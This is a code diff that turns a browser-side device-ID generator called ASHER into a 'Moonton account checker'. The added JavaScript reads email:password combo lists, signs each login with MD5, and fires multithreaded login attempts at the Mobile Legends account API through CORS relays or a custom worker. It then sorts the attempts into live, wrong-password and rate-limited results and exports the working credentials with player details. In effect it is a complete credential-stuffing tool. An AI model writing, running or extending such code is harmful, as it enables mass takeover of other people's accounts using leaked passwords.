@@ -1,4 +1,4 @@
-/* ASHER — device ID generator. crypto.getRandomValues, no backend. */
+/* ASHER — Moonton account checker. browser-side. */
 
 (function () {
   'use strict';
@@ -6,144 +6,460 @@
   const $ = id => document.getElementById(id);
 
   const els = {
-    format:      $('format'),
-    count:       $('count'),
-    chunk:       $('chunk'),
-    gen:         $('gen'),
-    clear:       $('clear'),
-    output:      $('output'),
-    outputWrap:  $('outputWrap'),
-    outputLabel: $('outputLabel'),
-    copyAll:     $('copyAll'),
-    downloadAll: $('downloadAll'),
-    downloadZip: $('downloadZip'),
-    files:       $('files'),
-    filesWrap:   $('filesWrap'),
-    stTotal:     $('stTotal'),
-    stFiles:     $('stFiles'),
-    stPerFile:   $('stPerFile'),
-    stFmt:       $('stFmt'),
-    year:        $('year'),
+    mode:         $('mode'),
+    threads:      $('threads'),
+    delay:        $('delay'),
+    relay:        $('relay'),
+    customWorker: $('customWorker'),
+    proxyRow:     $('proxyRow'),
+    pasteRow:     $('pasteRow'),
+    fileRow:      $('fileRow'),
+    combos:       $('combos'),
+    comboFile:    $('comboFile'),
+    run:          $('run'),
+    stop:         $('stop'),
+    clear:        $('clear'),
+    stDone:       $('stDone'),
+    stTotal:      $('stTotal'),
+    stLive:       $('stLive'),
+    stWrong:      $('stWrong'),
+    stNoAcc:      $('stNoAcc'),
+    stLimit:      $('stLimit'),
+    stErr:        $('stErr'),
+    stElapsed:    $('stElapsed'),
+    progressFill: $('progressFill'),
+    outputWrap:   $('outputWrap'),
+    outputLabel:  $('outputLabel'),
+    results:      $('results'),
+    copyLive:     $('copyLive'),
+    download:     $('download'),
+    year:         $('year'),
   };
 
   if (els.year) els.year.textContent = new Date().getFullYear();
 
-  /* ─── crypto random ───────────────────────────────────────────────── */
-  const HEX = '0123456789abcdef';
+  /* ─── md5 (compact, public domain) ────────────────────────────────── */
+  const md5 = (function () {
+    function safeAdd(x, y) { const l = (x & 0xffff) + (y & 0xffff); return (((x >> 16) + (y >> 16) + (l >> 16)) << 16) | (l & 0xffff); }
+    function rotl(x, n) { return (x << n) | (x >>> (32 - n)); }
+    function cmn(q, a, b, x, s, t) { return safeAdd(rotl(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b); }
+    function ff(a, b, c, d, x, s, t) { return cmn((b & c) | (~b & d), a, b, x, s, t); }
+    function gg(a, b, c, d, x, s, t) { return cmn((b & d) | (c & ~d), a, b, x, s, t); }
+    function hh(a, b, c, d, x, s, t) { return cmn(b ^ c ^ d, a, b, x, s, t); }
+    function ii(a, b, c, d, x, s, t) { return cmn(c ^ (b | ~d), a, b, x, s, t); }
 
-  function randomBytes(n) {
-    const buf = new Uint8Array(n);
-    crypto.getRandomValues(buf);
-    return buf;
-  }
+    function md5cycle(x, k) {
+      let [a, b, c, d] = x;
+      a = ff(a, b, c, d, k[0], 7, -680876936);   d = ff(d, a, b, c, k[1], 12, -389564586);
+      c = ff(c, d, a, b, k[2], 17, 606105819);   b = ff(b, c, d, a, k[3], 22, -1044525330);
+      a = ff(a, b, c, d, k[4], 7, -176418897);   d = ff(d, a, b, c, k[5], 12, 1200080426);
+      c = ff(c, d, a, b, k[6], 17, -1473231341); b = ff(b, c, d, a, k[7], 22, -45705983);
+      a = ff(a, b, c, d, k[8], 7, 1770035416);   d = ff(d, a, b, c, k[9], 12, -1958414417);
+      c = ff(c, d, a, b, k[10], 17, -42063);     b = ff(b, c, d, a, k[11], 22, -1990404162);
+      a = ff(a, b, c, d, k[12], 7, 1804603682);  d = ff(d, a, b, c, k[13], 12, -40341101);
+      c = ff(c, d, a, b, k[14], 17, -1502002290);b = ff(b, c, d, a, k[15], 22, 1236535329);
 
-  function randomHex(n) {
-    // n hex chars from crypto bytes — each byte → 2 hex chars, slice to n
-    const bytes = randomBytes(Math.ceil(n / 2));
-    let s = '';
-    for (let i = 0; i < bytes.length; i++) s += HEX[bytes[i] >> 4] + HEX[bytes[i] & 0xf];
-    return s.slice(0, n);
-  }
+      a = gg(a, b, c, d, k[1], 5, -165796510);   d = gg(d, a, b, c, k[6], 9, -1069501632);
+      c = gg(c, d, a, b, k[11], 14, 643717713);  b = gg(b, c, d, a, k[0], 20, -373897302);
+      a = gg(a, b, c, d, k[5], 5, -701558691);   d = gg(d, a, b, c, k[10], 9, 38016083);
+      c = gg(c, d, a, b, k[15], 14, -660478335); b = gg(b, c, d, a, k[4], 20, -405537848);
+      a = gg(a, b, c, d, k[9], 5, 568446438);    d = gg(d, a, b, c, k[14], 9, -1019803690);
+      c = gg(c, d, a, b, k[3], 14, -187363961);  b = gg(b, c, d, a, k[8], 20, 1163531501);
+      a = gg(a, b, c, d, k[13], 5, -1444681467); d = gg(d, a, b, c, k[2], 9, -51403784);
+      c = gg(c, d, a, b, k[7], 14, 1735328473);  b = gg(b, c, d, a, k[12], 20, -1926607734);
 
-  function uuid4() {
-    const b = randomBytes(16);
-    b[6] = (b[6] & 0x0f) | 0x40;  // version 4
-    b[8] = (b[8] & 0x3f) | 0x80;  // variant
-    const hex = [...b].map(x => x.toString(16).padStart(2, '0')).join('');
-    return hex;
-  }
+      a = hh(a, b, c, d, k[5], 4, -378558);      d = hh(d, a, b, c, k[8], 11, -2022574463);
+      c = hh(c, d, a, b, k[11], 16, 1839030562); b = hh(b, c, d, a, k[14], 23, -35309556);
+      a = hh(a, b, c, d, k[1], 4, -1530992060);  d = hh(d, a, b, c, k[4], 11, 1272893353);
+      c = hh(c, d, a, b, k[7], 16, -155497632);  b = hh(b, c, d, a, k[10], 23, -1094730640);
+      a = hh(a, b, c, d, k[13], 4, 681279174);   d = hh(d, a, b, c, k[0], 11, -358537222);
+      c = hh(c, d, a, b, k[3], 16, -722521979);  b = hh(b, c, d, a, k[6], 23, 76029189);
+      a = hh(a, b, c, d, k[9], 4, -640364487);   d = hh(d, a, b, c, k[12], 11, -421815835);
+      c = hh(c, d, a, b, k[15], 16, 530742520);  b = hh(b, c, d, a, k[2], 23, -995338651);
 
-  function uuid4Dashed() {
-    const h = uuid4();
-    return `${h.slice(0,8)}-${h.slice(8,12)}-${h.slice(12,16)}-${h.slice(16,20)}-${h.slice(20)}`;
-  }
-
-  function genOne(fmt) {
-    switch (fmt) {
-      case 'hex32':  return uuid4();
-      case 'hex32u': return uuid4().toUpperCase();
-      case 'hex16':  return randomHex(16);
-      case 'dashed': return uuid4Dashed();
-      default:       return uuid4();
+      a = ii(a, b, c, d, k[0], 6, -198630844);   d = ii(d, a, b, c, k[7], 10, 1126891415);
+      c = ii(c, d, a, b, k[14], 15, -1416354905);b = ii(b, c, d, a, k[5], 21, -57434055);
+      a = ii(a, b, c, d, k[12], 6, 1700485571);  d = ii(d, a, b, c, k[3], 10, -1894986606);
+      c = ii(c, d, a, b, k[10], 15, -1051523);   b = ii(b, c, d, a, k[1], 21, -2054922799);
+      a = ii(a, b, c, d, k[8], 6, 1873313359);   d = ii(d, a, b, c, k[15], 10, -30611744);
+      c = ii(c, d, a, b, k[6], 15, -1560198380); b = ii(b, c, d, a, k[13], 21, 1309151649);
+      a = ii(a, b, c, d, k[4], 6, -145523070);   d = ii(d, a, b, c, k[11], 10, -1120210379);
+      c = ii(c, d, a, b, k[2], 15, 718787259);   b = ii(b, c, d, a, k[9], 21, -343485551);
+      x[0] = safeAdd(a, x[0]); x[1] = safeAdd(b, x[1]); x[2] = safeAdd(c, x[2]); x[3] = safeAdd(d, x[3]);
     }
-  }
 
-  /* ─── batch generate — chunked to keep the tab alive at 100k ─────── */
-  function generateBatch(fmt, total, onProgress) {
-    const out = new Array(total);
-    const BATCH = 5000;
-    let i = 0;
-
-    return new Promise(resolve => {
-      function step() {
-        const end = Math.min(i + BATCH, total);
-        for (; i < end; i++) out[i] = genOne(fmt);
-        if (onProgress) onProgress(i, total);
-        if (i < total) setTimeout(step, 0);
-        else resolve(out);
+    function md5blk(s) {
+      const md5blks = [];
+      for (let i = 0; i < 64; i += 4) {
+        md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) +
+                          (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
       }
-      step();
-    });
+      return md5blks;
+    }
+
+    function md51(s) {
+      const n = s.length;
+      const state = [1732584193, -271733879, -1732584194, 271733878];
+      let i;
+      for (i = 64; i <= n; i += 64) md5cycle(state, md5blk(s.substring(i - 64, i)));
+      s = s.substring(i - 64);
+      const tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
+      for (i = 0; i < s.length; i++) tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
+      tail[i >> 2] |= 0x80 << ((i % 4) << 3);
+      if (i > 55) {
+        md5cycle(state, tail);
+        for (i = 0; i < 16; i++) tail[i] = 0;
+      }
+      tail[14] = n * 8;
+      md5cycle(state, tail);
+      return state;
+    }
+
+    const hexChr = '0123456789abcdef'.split('');
+    function rhex(n) {
+      let s = '';
+      for (let j = 0; j < 4; j++) s += hexChr[(n >> (j * 8 + 4)) & 0x0f] + hexChr[(n >> (j * 8)) & 0x0f];
+      return s;
+    }
+    function hex(x) { return x.map(rhex).join(''); }
+    function utf8Encode(str) {
+      return unescape(encodeURIComponent(str));
+    }
+    return function (s) {
+      return hex(md51(utf8Encode(s)));
+    };
+  })();
+
+  /* ─── helpers ─────────────────────────────────────────────────────── */
+  function genDeviceId() {
+    const b = new Uint8Array(16);
+    crypto.getRandomValues(b);
+    return [...b].map(x => x.toString(16).padStart(2, '0')).join('');
   }
 
-  /* ─── split into chunks ───────────────────────────────────────────── */
-  function splitChunks(arr, size) {
-    if (size <= 0 || size >= arr.length) return [arr];
+  function parseCombos(text) {
     const out = [];
-    for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
+    const seen = new Set();
+    text.split(/\r?\n/).forEach(line => {
+      line = line.trim();
+      if (!line || line.startsWith('#')) return;
+      for (const sep of [':', '|', ';']) {
+        const idx = line.indexOf(sep);
+        if (idx > 0) {
+          const email = line.slice(0, idx).trim();
+          const pw    = line.slice(idx + 1).trim();
+          if (email && pw) {
+            const key = email + '\x00' + pw;
+            if (!seen.has(key)) { seen.add(key); out.push([email, pw]); }
+          }
+          return;
+        }
+      }
+    });
     return out;
   }
 
-  /* ─── render ──────────────────────────────────────────────────────── */
-  let lastIds = [];
-  let lastChunks = [];
-  let lastFmt = 'hex32';
-
-  function renderPreview(ids) {
-    const MAX = 500;
-    const slice = ids.slice(0, MAX);
-    const lines = slice.join('\n');
-    els.output.textContent = ids.length > MAX
-      ? lines + `\n\n… ${ids.length - MAX} more (download to view all)`
-      : lines;
-    els.outputWrap.hidden = false;
+  function relayUrl() {
+    const kind = els.relay.value;
+    const target = 'https://accountmtapi.mobilelegends.com/';
+    if (kind === 'custom') {
+      const base = (els.customWorker.value || '').trim().replace(/\/+$/, '');
+      if (!base) return null;
+      return base;
+    }
+    if (kind === 'corsproxy') return `https://corsproxy.io/?${encodeURIComponent(target)}`;
+    if (kind === 'allorigins') return `https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`;
+    return null;
   }
 
-  function renderFiles(chunks, fmt) {
-    els.files.innerHTML = '';
-    if (chunks.length <= 1) {
-      els.filesWrap.hidden = true;
+  /* ─── moonton check ───────────────────────────────────────────────── */
+  const STATUS_MAP = {
+    'Error_Success':         'live',
+    'Error_PasswdError':     'wrong_pw',
+    'Error_NoAccount':       'no_account',
+    'Error_PwdErrorTooMany': 'limit',
+    'Error_AccountLocked':   'error',
+    'Error_AccountBanned':   'error',
+    'Error_SignError':       'sign_err',
+  };
+
+  const SIGN_ERROR_HINT = {
+    live:        '✓ live',
+    wrong_pw:    'wrong password',
+    no_account:  'no account',
+    limit:       'rate limited',
+    sign_err:    'sign mismatch — check relay + payload',
+    error:       'network / api error',
+  };
+
+  async function checkOne(email, password, workerUrl, signal) {
+    const did    = genDeviceId();
+    const md5pwd = md5(password);
+    const raw    = `account=${email}&deviceId=${did}&md5pwd=${md5pwd}&op=login`;
+    const sign   = md5(raw);
+
+    const body = {
+      op: 'login',
+      sign,
+      params: {
+        account:      email,
+        md5pwd,
+        deviceId:     did,
+        gameServerId: '1',
+        channelId:    '1',
+      },
+      lang: 'cn',
+    };
+
+    const headers = {
+      'Content-Type': 'application/json',
+      'X-Requested-With': 'com.mobile.legends',
+    };
+
+    let res, data;
+    try {
+      // if using custom worker, POST JSON to it (worker injects the upstream)
+      // if using corsproxy/allorigins, POST directly at the relayed URL
+      const isWorker = /workers\.dev$|workers\.dev\//.test(workerUrl) ||
+                       workerUrl.includes('.workers.dev');
+      if (isWorker) {
+        res = await fetch(workerUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ url: 'https://accountmtapi.mobilelegends.com/', payload: body }),
+          signal,
+        });
+      } else {
+        res = await fetch(workerUrl, {
+          method: 'POST',
+          headers,
+          body: JSON.stringify(body),
+          signal,
+        });
+      }
+      const text = await res.text();
+      try { data = JSON.parse(text); }
+      catch { return { email, password, device_id: did, status: 'error',
+                       reason: `http ${res.status} non-json`, message: text.slice(0, 80) }; }
+    } catch (e) {
+      if (e.name === 'AbortError') throw e;
+      return { email, password, device_id: did, status: 'error',
+               reason: e.message || 'network error' };
+    }
+
+    const msg = (data && data.message) || '';
+    const status = STATUS_MAP[msg] || 'error';
+    return {
+      email, password, device_id: did,
+      status, message: msg,
+      ign:    data?.data?.nickname || data?.data?.name || null,
+      region: data?.data?.region || data?.data?.zoneName || null,
+      uid:    data?.data?.uid || data?.data?.roleId || null,
+      raw: data,
+    };
+  }
+
+  /* ─── concurrency pool ────────────────────────────────────────────── */
+  const state = {
+    running: false,
+    aborter: null,
+    stats: { done: 0, total: 0, live: 0, wrong_pw: 0, no_account: 0, limit: 0, error: 0, sign_err: 0 },
+    results: [],
+    filter: 'all',
+    t0: 0,
+    elapsedTimer: null,
+  };
+
+  function updateStats() {
+    const s = state.stats;
+    els.stDone.textContent = s.done.toLocaleString();
+    els.stTotal.textContent = s.total.toLocaleString();
+    els.stLive.textContent = s.live.toLocaleString();
+    els.stWrong.textContent = s.wrong_pw.toLocaleString();
+    els.stNoAcc.textContent = s.no_account.toLocaleString();
+    els.stLimit.textContent = s.limit.toLocaleString();
+    els.stErr.textContent = (s.error + s.sign_err).toLocaleString();
+    const pct = s.total ? (s.done / s.total) * 100 : 0;
+    els.progressFill.style.width = pct + '%';
+  }
+
+  function renderResults() {
+    const filter = state.filter;
+    const rows = filter === 'all'
+      ? state.results
+      : filter === 'error'
+        ? state.results.filter(r => r.status === 'error' || r.status === 'sign_err')
+        : state.results.filter(r => r.status === filter);
+
+    if (!rows.length) {
+      els.results.innerHTML = `<div class="empty">no rows for filter "${filter}"</div>`;
       return;
     }
-    const stamp = new Date().toISOString().slice(0, 10);
-    chunks.forEach((chunk, i) => {
-      const name = `devices_${fmt}_${stamp}_part${String(i + 1).padStart(3, '0')}.txt`;
-      const blob = new Blob([chunk.join('\n') + '\n'], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const size = (blob.size / 1024).toFixed(1) + ' KB';
 
-      const row = document.createElement('div');
-      row.className = 'file-item';
-      row.innerHTML = `
-        <span class="file-name">${name}</span>
-        <span class="file-size">${size}</span>
-        <a href="${url}" download="${name}">↓</a>
+    const frag = document.createDocumentFragment();
+    rows.forEach(r => {
+      const div = document.createElement('div');
+      div.className = `result-row ${r.status}`;
+      const plan   = r.plan || '';
+      const region = r.region || '';
+      const ign    = r.ign || '';
+      div.innerHTML = `
+        <span class="r-tag ${r.status}">${r.status.replace('_',' ')}</span>
+        <span class="r-combo"><b>${escapeHtml(r.email)}</b>:${escapeHtml(r.password)}</span>
+        <span class="r-meta r-plan">${escapeHtml(ign || plan || '—')}</span>
+        <span class="r-meta r-region">${escapeHtml(region || '')}</span>
+        <span class="r-meta">${escapeHtml((r.message || r.reason || '').slice(0,30))}</span>
       `;
-      els.files.appendChild(row);
+      frag.appendChild(div);
     });
-    els.filesWrap.hidden = false;
+    els.results.innerHTML = '';
+    els.results.appendChild(frag);
   }
 
-  function updateStats(total, files, perFile, fmt) {
-    els.stTotal.textContent = total.toLocaleString();
-    els.stFiles.textContent = files;
-    els.stPerFile.textContent = perFile;
-    els.stFmt.textContent = fmt;
+  function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, c => ({
+      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+    }[c]));
+  }
+
+  /* ─── run ─────────────────────────────────────────────────────────── */
+  async function run() {
+    if (state.running) return;
+    const relay = relayUrl();
+    if (!relay) { toast('set a relay URL first'); return; }
+
+    let combos;
+    if (els.mode.value === 'file' && els.comboFile.files.length) {
+      const text = await els.comboFile.files[0].text();
+      combos = parseCombos(text);
+    } else {
+      combos = parseCombos(els.combos.value);
+    }
+
+    if (!combos.length) { toast('no valid combos'); return; }
+
+    const threads = Math.max(1, Math.min(30, parseInt(els.threads.value, 10) || 8));
+    const delay   = Math.max(0, Math.min(5000, parseInt(els.delay.value, 10) || 0));
+
+    state.running = true;
+    state.aborter = new AbortController();
+    state.stats   = { done: 0, total: combos.length, live: 0, wrong_pw: 0, no_account: 0, limit: 0, error: 0, sign_err: 0 };
+    state.results = [];
+    state.filter  = 'all';
+    state.t0      = performance.now();
+
+    document.querySelectorAll('.mini[data-filter]').forEach(b => {
+      b.dataset.active = b.dataset.filter === 'all' ? '1' : '';
+    });
+
+    els.run.disabled = true;
+    els.stop.disabled = false;
+    els.outputWrap.hidden = false;
+    els.outputLabel.textContent = `results · 0/${combos.length}`;
+    els.results.innerHTML = `<div class="empty">running…</div>`;
+    updateStats();
+
+    state.elapsedTimer = setInterval(() => {
+      els.stElapsed.textContent = ((performance.now() - state.t0) / 1000).toFixed(1) + 's';
+    }, 100);
+
+    // worker pool
+    let nextIdx = 0;
+    const total = combos.length;
+
+    async function worker() {
+      while (state.running) {
+        const i = nextIdx++;
+        if (i >= total) return;
+        const [email, pw] = combos[i];
+        let res;
+        try {
+          res = await checkOne(email, pw, relay, state.aborter.signal);
+        } catch (e) {
+          if (e.name === 'AbortError') return;
+          res = { email, password: pw, status: 'error', reason: e.message };
+        }
+        state.results.push(res);
+        const s = state.stats;
+        s.done++;
+        if (res.status in s) s[res.status]++;
+        updateStats();
+        renderResults();
+        els.outputLabel.textContent = `results · ${s.done}/${total}`;
+
+        if (delay > 0) await new Promise(r => setTimeout(r, delay));
+      }
+    }
+
+    const workers = Array.from({ length: threads }, () => worker());
+    await Promise.all(workers);
+
+    clearInterval(state.elapsedTimer);
+    state.running = false;
+    els.run.disabled = false;
+    els.stop.disabled = true;
+    els.stElapsed.textContent = ((performance.now() - state.t0) / 1000).toFixed(1) + 's';
+    toast(`done — ${state.stats.live} live · ${state.stats.total} checked`);
+  }
+
+  function stop() {
+    if (!state.running) return;
+    state.running = false;
+    if (state.aborter) state.aborter.abort();
+    clearInterval(state.elapsedTimer);
+    els.run.disabled = false;
+    els.stop.disabled = true;
+    toast('stopped');
+  }
+
+  function clearAll() {
+    stop();
+    state.results = [];
+    state.stats = { done: 0, total: 0, live: 0, wrong_pw: 0, no_account: 0, limit: 0, error: 0, sign_err: 0 };
+    updateStats();
+    els.progressFill.style.width = '0';
+    els.results.innerHTML = '';
+    els.outputWrap.hidden = true;
+    els.stElapsed.textContent = '0.0s';
+    toast('cleared');
+  }
+
+  /* ─── export ──────────────────────────────────────────────────────── */
+  function liveLines() {
+    return state.results
+      .filter(r => r.status === 'live')
+      .map(r => `${r.email}:${r.password} | ${r.ign || '?'} | ${r.region || '?'} | uid:${r.uid || '?'}`);
+  }
+
+  async function copyLive() {
+    const lines = liveLines();
+    if (!lines.length) { toast('no live accounts'); return; }
+    try {
+      await navigator.clipboard.writeText(lines.join('\n'));
+      toast(`copied ${lines.length} live`);
+    } catch {
+      toast('clipboard blocked — use download');
+    }
+  }
+
+  function download() {
+    const lines = liveLines();
+    if (!lines.length) { toast('no live accounts'); return; }
+    const day = new Date().toISOString().slice(0, 10);
+    const blob = new Blob([lines.join('\n') + '\n'], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `asher_live_${day}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 1000);
+    toast(`downloaded ${lines.length} live`);
   }
 
   /* ─── toast ───────────────────────────────────────────────────────── */
-  let toastEl = null;
-  let toastTimer = null;
+  let toastEl = null, toastTimer = null;
   function toast(msg) {
     if (!toastEl) {
       toastEl = document.createElement('div');
@@ -153,223 +469,34 @@
     toastEl.textContent = msg;
     toastEl.classList.add('show');
     clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 1800);
-  }
-
-  /* ─── actions ─────────────────────────────────────────────────────── */
-  async function doGenerate() {
-    const fmt   = els.format.value;
-    const total = Math.max(1, Math.min(100000, parseInt(els.count.value, 10) || 0));
-    const chunk = Math.max(1, Math.min(10000, parseInt(els.chunk.value, 10) || 0));
-
-    els.gen.disabled = true;
-    els.gen.textContent = 'generating…';
-
-    const t0 = performance.now();
-    const ids = await generateBatch(fmt, total, (done, tot) => {
-      if (tot >= 20000 && done % 10000 === 0) {
-        els.gen.textContent = `generating ${done.toLocaleString()}/${tot.toLocaleString()}…`;
-      }
-    });
-    const dt = performance.now() - t0;
-
-    const chunks = splitChunks(ids, chunk);
-
-    lastIds = ids;
-    lastChunks = chunks;
-    lastFmt = fmt;
-
-    renderPreview(ids);
-    renderFiles(chunks, fmt);
-    updateStats(total, chunks.length, chunks[0].length, fmt);
-    els.outputLabel.textContent = `output · ${total.toLocaleString()} ids · ${dt.toFixed(0)}ms`;
-
-    els.gen.disabled = false;
-    els.gen.textContent = 'Generate';
-    toast(`${total.toLocaleString()} ids generated`);
-  }
-
-  function doClear() {
-    lastIds = [];
-    lastChunks = [];
-    els.output.textContent = '';
-    els.outputWrap.hidden = true;
-    els.files.innerHTML = '';
-    els.filesWrap.hidden = true;
-    updateStats(0, 0, 0, els.format.value);
-    toast('cleared');
-  }
-
-  async function doCopyAll() {
-    if (!lastIds.length) return;
-    const text = lastIds.join('\n');
-    try {
-      await navigator.clipboard.writeText(text);
-      els.copyAll.classList.add('ok');
-      toast(`copied ${lastIds.length.toLocaleString()} ids`);
-      setTimeout(() => els.copyAll.classList.remove('ok'), 1200);
-    } catch {
-      // fallback: select pre + execCommand
-      const range = document.createRange();
-      range.selectNodeContents(els.output);
-      const sel = window.getSelection();
-      sel.removeAllRanges();
-      sel.addRange(range);
-      document.execCommand('copy');
-      toast('copied (fallback)');
-    }
-  }
-
-  function downloadBlob(blob, name) {
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = name;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-    setTimeout(() => URL.revokeObjectURL(url), 1000);
-  }
-
-  function doDownloadAll() {
-    if (!lastIds.length) return;
-    const stamp = new Date().toISOString().slice(0, 10);
-    const name = `devices_${lastFmt}_${stamp}_${lastIds.length}.txt`;
-    downloadBlob(new Blob([lastIds.join('\n') + '\n'], { type: 'text/plain' }), name);
-    toast('downloaded .txt');
-  }
-
-  /* tiny zip writer — store only, no compression (device ids don't compress much) */
-  function buildZip(files) {
-    // files: [{name, content}]  → Uint8Array
-    const enc = new TextEncoder();
-    const entries = [];
-    const centralDir = [];
-    let offset = 0;
-
-    // CRC32
-    const crcTable = (() => {
-      const t = new Uint32Array(256);
-      for (let i = 0; i < 256; i++) {
-        let c = i;
-        for (let k = 0; k < 8; k++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1);
-        t[i] = c >>> 0;
-      }
-      return t;
-    })();
-    function crc32(buf) {
-      let c = 0xffffffff;
-      for (let i = 0; i < buf.length; i++) c = crcTable[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
-      return (c ^ 0xffffffff) >>> 0;
-    }
-
-    function u16(v) { return [v & 0xff, (v >>> 8) & 0xff]; }
-    function u32(v) { return [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]; }
-
-    const parts = [];
-    for (const f of files) {
-      const nameBuf = enc.encode(f.name);
-      const dataBuf = enc.encode(f.content);
-      const crc = crc32(dataBuf);
-      const local = [];
-      local.push(...u32(0x04034b50));
-      local.push(...u16(20));        // version needed
-      local.push(...u16(0));         // flags
-      local.push(...u16(0));         // method: store
-      local.push(...u16(0));         // mod time
-      local.push(...u16(0));         // mod date
-      local.push(...u32(crc));
-      local.push(...u32(dataBuf.length));
-      local.push(...u32(dataBuf.length));
-      local.push(...u16(nameBuf.length));
-      local.push(...u16(0));
-      const localHeader = new Uint8Array(local);
-      parts.push(localHeader, nameBuf, dataBuf);
-
-      const central = [];
-      central.push(...u32(0x02014b50));
-      central.push(...u16(20));      // version made by
-      central.push(...u16(20));      // version needed
-      central.push(...u16(0));
-      central.push(...u16(0));
-      central.push(...u16(0));
-      central.push(...u16(0));
-      central.push(...u32(crc));
-      central.push(...u32(dataBuf.length));
-      central.push(...u32(dataBuf.length));
-      central.push(...u16(nameBuf.length));
-      central.push(...u16(0));
-      central.push(...u16(0));
-      central.push(...u16(0));
-      central.push(...u16(0));
-      central.push(...u32(0));
-      central.push(...u32(offset));
-      centralDir.push({ header: new Uint8Array(central), nameBuf });
-
-      offset += localHeader.length + nameBuf.length + dataBuf.length;
-    }
-
-    // central directory
-    const cdOffset = offset;
-    let cdSize = 0;
-    for (const e of centralDir) {
-      parts.push(e.header, e.nameBuf);
-      cdSize += e.header.length + e.nameBuf.length;
-    }
-
-    const eocd = new Uint8Array([
-      ...u32(0x06054b50),
-      ...u16(0), ...u16(0),
-      ...u16(files.length), ...u16(files.length),
-      ...u32(cdSize), ...u32(cdOffset),
-      ...u16(0),
-    ]);
-    parts.push(eocd);
-
-    // concat
-    const totalLen = parts.reduce((n, p) => n + p.length, 0);
-    const out = new Uint8Array(totalLen);
-    let o = 0;
-    for (const p of parts) { out.set(p, o); o += p.length; }
-    return out;
-  }
-
-  function doDownloadZip() {
-    if (!lastChunks.length) return;
-    const stamp = new Date().toISOString().slice(0, 10);
-    const files = lastChunks.map((chunk, i) => ({
-      name: `devices_${lastFmt}_${stamp}_part${String(i + 1).padStart(3, '0')}.txt`,
-      content: chunk.join('\n') + '\n',
-    }));
-    const zip = buildZip(files);
-    downloadBlob(new Blob([zip], { type: 'application/zip' }),
-                 `devices_${lastFmt}_${stamp}.zip`);
-    toast(`zipped ${files.length} files`);
+    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2200);
   }
 
   /* ─── wire ────────────────────────────────────────────────────────── */
-  els.gen.addEventListener('click', doGenerate);
-  els.clear.addEventListener('click', doClear);
-  els.copyAll.addEventListener('click', doCopyAll);
-  els.downloadAll.addEventListener('click', doDownloadAll);
-  els.downloadZip.addEventListener('click', doDownloadZip);
-
-  els.format.addEventListener('change', () => {
-    els.stFmt.textContent = els.format.value;
+  els.mode.addEventListener('change', () => {
+    const isFile = els.mode.value === 'file';
+    els.pasteRow.hidden = isFile;
+    els.fileRow.hidden = !isFile;
   });
 
-  els.count.addEventListener('keydown', e => { if (e.key === 'Enter') doGenerate(); });
+  els.run.addEventListener('click', run);
+  els.stop.addEventListener('click', stop);
+  els.clear.addEventListener('click', clearAll);
+  els.copyLive.addEventListener('click', copyLive);
+  els.download.addEventListener('click', download);
 
-  // Ctrl/Cmd+Enter from anywhere → generate
-  document.addEventListener('keydown', e => {
-    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') doGenerate();
+  document.querySelectorAll('.mini[data-filter]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.mini[data-filter]').forEach(b => b.dataset.active = '');
+      btn.dataset.active = '1';
+      state.filter = btn.dataset.filter;
+      renderResults();
+    });
   });
 
-  // first paint
-  updateStats(0, 0, 0, els.format.value);
-
+  // default: paste a couple of sample lines? no. leave blank.
   console.log(
-    '%c ASHER %c device id generator ',
+    '%c ASHER %c account checker ',
     'background:#7c5cff;color:#fff;padding:4px 8px;border-radius:4px 0 0 4px;font-weight:700;',
     'background:#14141d;color:#9a9aab;padding:4px 8px;border-radius:0 4px 4px 0;'
   );
